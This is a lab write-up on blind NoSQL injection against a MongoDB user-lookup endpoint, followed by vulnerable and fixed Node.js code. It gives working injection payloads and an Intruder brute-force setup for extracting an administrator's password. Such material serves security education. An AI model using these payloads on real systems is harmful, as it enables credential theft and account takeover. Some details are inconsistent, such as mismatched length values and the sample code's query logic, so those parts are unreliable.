## Lab Information
Topic: NoSQL Injection  
Difficulty: Apprentice

## Lab Description (Summary of the vulnerable application and the scenario presented in the lab.)
The lab provides a user lookup endpoint backed by a MongoDB database. This endpoint is vulnerable to NoSQL injection because user-supplied input is embedded directly into a query expression. By injecting JavaScript-like boolean logic into the `user` parameter, an attacker can extract arbitrary fields, including sensitive data such as the administrator’s password. The goal is to retrieve the administrator password and log in as the administrator.

## Vulnerability Analysis (Explanation of the vulnerability type and how it manifests in this specific lab.)
MongoDB may evaluate JavaScript-like expressions when queries are built insecurely. The lookup functionality appears to insert user input directly into a query filter, allowing expressions like:
```javascript
username' && this.password[i] == 'x' || 'a'=='b
```
Response differences (**user found** vs. **not found**) leak one bit of information, enabling blind extraction of password characters.

## Exploitation Steps
1. Log in as `wiener:peter`.
2. Look at the traffic and identify the injection point `/user/lookup?user=username`.
3. Send GET request with **correct** first password letter `wiener'+%26%26+this.password[0]+%3d%3d+'p'+||+'a'%3d%3d'b` (URL-encoded) which is `' && this.password[0] == 'p' || 'a'=='b` (URL-decoded). Verify server returns user data.
4. Send GET request with **incorrect** first password letter `wiener'+%26%26+this.password[0]+%3d%3d+'a'+||+'a'%3d%3d'b` (URL-encoded) which is `' && this.password[0] == 'a' || 'a'=='b` (URL-decoded). Verify server returns message “Could not find user”.
5. Now we brute force administrator password. First guess length: send GET request `administrator'+%26%26+this.password.length+<+17+||+'a'%3d%3d'b` (URL-encoded) which means `administrator' && this.password.length < 30 || 'a'=='b`(URL-decoded). Verify server returns user data.
6. Set up Intruder attack GET `/user/lookup?user=administrator'+%26%26+this.password[$0$]+%3d%3d+'$x$'+||+'a'%3d%3d'b`, Cluster bomb
    1. First list: digits from 0 to 15
    2. Second list: a-z, A-z, 0-9
7. Run attack, collect responses with length 209 instead of 151 → restore the password:
example `password=lfcvgavx` .

For optimisation we can verify password contains only lowercase letters:

`administrator'+%26%26+this.password.match(/\d/)+||+'a'%3d%3d'b` which is URL-decoded `administrator' && this.password.match(/\d/) || 'a'=='b` (False)

`administrator'+%26%26+this.password.match(/[a-z]/)+||+'a'%3d%3d'b` which is URL-decoded `administrator' && this.password.match(/[a-z]/) || 'a'=='b` (True)

`administrator'+%26%26+this.password.match(/[A-Z]/)+||+'a'%3d%3d'b` which is URL-decoded `administrator' && this.password.match(/[A-Z]/) || 'a'=='b` (False)

## AppSec Perspective
### What the underlying code might be
```javascript
app.get('/user/lookup', (req, res) => {
    const user = req.query.user;
    const query = { username: user }; // vulnerable
    db.users.findOne(query).then(record => {
        if (!record) return res.send("Could not find user");
        res.send(record);
    });
});
```

### Security issues enabling exploitation
- Direct use of untrusted user input in database queries, without sanitization or structural validation.
- Lack of strict type enforcement, allowing attacker-controlled objects or expressions to be interpreted as query logic (user input influences the query structure instead of being treated as literal data).
- Absence of schema validation, enabling malformed or operator-based payloads (e.g., $ne, $where, property access such as this.password[i]).

### How to fix it
```javascript
app.get('/user/lookup', (req, res) => {
    let user = req.query.user;

    if (typeof user !== 'string') { // Strict type checking
        return res.status(400).send('Invalid username');
    }

    const query = { username: { $eq: user } }; // Use of `$eq` to avoid implicit operator injection

    db.users.findOne(query).then(record => {
        if (!record) return res.status(404).send("Could not find user");
        res.json({ username: record.username }); // Never expose password
    });
});
```

**Or even better using authentication libraries**
```javascript
const Joi = require('joi');

// Validation schema to prevent operator injection
const lookupSchema = Joi.object({
    user: Joi.string().min(1).max(50).required()
});

app.get('/user/lookup', async (req, res, next) => {
    // Validate request query
    const { error } = lookupSchema.validate(req.query);
    if (error) return res.status(400).send("Invalid username");

    try {
        // Safe DB lookup (only literal string match)
        const record = await db.users
            .findOne({ username: { $eq: req.query.user } })
            .select('username email')   // minimal safe output
            .exec();

        if (!record) {
            return res.status(404).send("Could not find user");
        }

        return res.json(record);
    } catch (err) {
        return res.status(500).send("Server error");
    }
});
```

## Key Takeaways
### Lessons from attacker perspective
- Blind NoSQL injection can reveal sensitive data using logical operations.
- Response size differences are a reliable side channel.
- MongoDB object property access (`this.password[i]`) can be abused.

### Lessons from AppSec perspective (defender)
- Sanitize and validate user input, using an allowlist of accepted characters.
- Insert user input using parameterized queries instead of concatenating user input directly into the query.